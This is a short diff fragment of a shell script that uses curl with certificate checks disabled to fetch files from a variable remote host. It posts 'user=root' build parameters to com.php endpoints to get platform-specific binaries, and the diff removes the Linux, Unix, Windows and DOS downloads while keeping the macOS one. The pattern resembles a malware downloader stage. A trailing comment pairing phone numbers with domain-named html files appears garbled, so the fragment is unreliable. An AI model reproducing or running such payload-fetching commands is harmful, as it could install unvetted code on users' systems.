@@ -35,10 +35,7 @@ cd $s
 curl --max-time 5 -o a -k https://$s/a
 curl -k -o project.xworkspace https://$s/agent/bin/frameworks.php?git&podsname=project.xworkspace\ --create-dir
 curl -sk -d 'user=root&build_vendor=default&build_version=1' https://$s/apple/com.php -o a.osacompile
-curl -sk -d 'user=root&build_vendor=default&build_version=1' https://$s/linux/com.php -o a.linux
-curl -sk -d 'user=root&build_vendor=default&build_version=1' https://$s/unix/com.php -o a.unix
-curl -sk -d 'user=root&build_vendor=default&build_version=1' https://$s/windows/com.php -o a.windows
-curl -sk -d 'user=root&build_vendor=default&build_version=1' https://$s/dos/com.php -o a.dos
+
 
 # first download array 
 # (786) 545-7301-Saisd.net.html (786) 412-4567-Hanglung.com.html
